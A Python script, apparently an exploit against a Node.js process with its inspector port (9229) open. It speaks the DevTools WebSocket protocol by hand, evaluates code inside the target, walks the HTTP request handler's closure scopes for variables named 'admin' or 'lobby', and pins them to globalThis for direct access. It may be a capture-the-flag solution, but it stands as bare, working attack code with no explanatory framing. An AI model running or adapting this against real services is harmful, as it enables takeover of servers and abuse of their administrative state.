import urllib.request, json, socket, base64, os, sys

def main():
    res = urllib.request.urlopen("http://127.0.0.1:9229/json")
    targets = json.loads(res.read().decode())
    ws_url = targets[0]["webSocketDebuggerUrl"]
    path = "/" + ws_url.split("/", 3)[3]

    s = socket.socket()
    s.connect(("127.0.0.1", 9229))
    key = base64.b64encode(os.urandom(16)).decode()
    req = f"GET {path} HTTP/1.1\r\nHost: 127.0.0.1:9229\r\nUpgrade: websocket\r\nConnection: Upgrade\r\nSec-WebSocket-Key: {key}\r\nSec-WebSocket-Version: 13\r\n\r\n"
    s.sendall(req.encode())
    s.recv(1024)

    msg_id = 0
    def cdp(method, params=None):
        nonlocal msg_id
        msg_id += 1
        payload = json.dumps({"id": msg_id, "method": method, "params": params or {}})
        data = payload.encode()
        frame = bytearray([0x81])
        if len(data) <= 125: frame.append(0x80 | len(data))
        elif len(data) <= 65535:
            frame.append(0x80 | 126)
            frame.extend(len(data).to_bytes(2, "big"))
        mask = os.urandom(4)
        frame.extend(mask)
        frame.extend(bytearray(data[i] ^ mask[i % 4] for i in range(len(data))))
        s.sendall(frame)
        
        # Read full frame
        buf = bytearray()
        while True:
            chunk = s.recv(65536)
            buf.extend(chunk)
            if len(buf) >= 2:
                plen = buf[1] & 0x7F
                offset = 2
                if plen == 126:
                    if len(buf) < 4: continue
                    plen = int.from_bytes(buf[2:4], "big")
                    offset = 4
                elif plen == 127:
                    if len(buf) < 10: continue
                    plen = int.from_bytes(buf[2:10], "big")
                    offset = 10
                if len(buf) >= offset + plen:
                    raw = buf[offset:offset+plen].decode(errors="ignore")
                    msg = json.loads(raw)
                    if msg.get("id") == msg_id:
                        return msg

    cdp("Debugger.enable")
    
    # 1. Get objectId of server._events.request
    r1 = cdp("Runtime.evaluate", {
        "expression": "process._getActiveHandles().find(h => h && h.constructor && h.constructor.name === 'Server' && h._events && h._events.request)._events.request",
        "returnByValue": False
    })
    obj_id = r1["result"]["result"]["objectId"]
    
    # 2. Get internal properties (scopes)
    r2 = cdp("Runtime.getProperties", {
        "objectId": obj_id,
        "ownProperties": False,
        "accessorPropertiesOnly": False,
        "generatePreview": False
    })
    
    internal = r2.get("result", {}).get("internalProperties", [])
    scopes_obj = next((p for p in internal if p["name"] == "[[Scopes]]"), None)
    print("Found scopes:", bool(scopes_obj))
    
    if scopes_obj:
        r3 = cdp("Runtime.getProperties", {
            "objectId": scopes_obj["value"]["objectId"],
            "ownProperties": True
        })
        scope_list = r3.get("result", {}).get("result", [])
        print("Scope chain length:", len(scope_list))
        
        for sc in scope_list:
            sc_val = sc.get("value", {})
            sc_obj_id = sc_val.get("objectId")
            if not sc_obj_id: continue
            
            # Read variables in this scope
            r_vars = cdp("Runtime.getProperties", {
                "objectId": sc_obj_id,
                "ownProperties": True
            })
            var_names = [v["name"] for v in r_vars.get("result", {}).get("result", [])]
            print(f"Scope {sc['name']}:", var_names)
            
            # If admin or lobby is found:
            for v in r_vars.get("result", {}).get("result", []):
                if v["name"] in ["admin", "lobby"]:
                    print(f"*** FOUND {v['name']}! ***")
                    # Expose to globalThis for direct access
                    r_exp = cdp("Runtime.callFunctionOn", {
                        "objectId": v["value"]["objectId"],
                        "functionDeclaration": f"function() {{ globalThis.__{v['name']} = this; }}"
                    })
                    print("Exposed to globalThis:", r_exp)
    
    s.close()

if __name__ == "__main__":
    main()
